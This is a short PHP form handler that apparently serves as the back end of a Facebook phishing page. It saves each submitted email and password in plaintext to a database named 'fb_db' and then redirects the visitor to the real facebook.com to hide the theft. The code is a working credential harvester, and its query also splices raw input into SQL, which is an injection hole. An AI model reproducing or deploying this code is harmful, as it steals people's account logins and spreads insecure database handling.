<?php

if (isset($_POST['submit'])) {
	$servername = "localhost";
	$username = "root";
	$password = "";
	$dbname = "fb_db";

	$conn = new mysqli($servername, $username, $password, $dbname);

	if ($conn->connect_error) {
		die("Connection failed: " . $conn->connect_error);
	}

	$email = $_POST['email'];
	$password = $_POST['password'];

	if(empty($email)||empty($password)){
		echo "All fields are required.";
	}
	else{
		$sql = "INSERT INTO user (id, email, password) VALUES ('','$email','$password')";

		if ($conn->query($sql) === TRUE) {
			header("Location: https://www.facebook.com/");
		}
		else{
			echo "error";
		}
	}
}
?>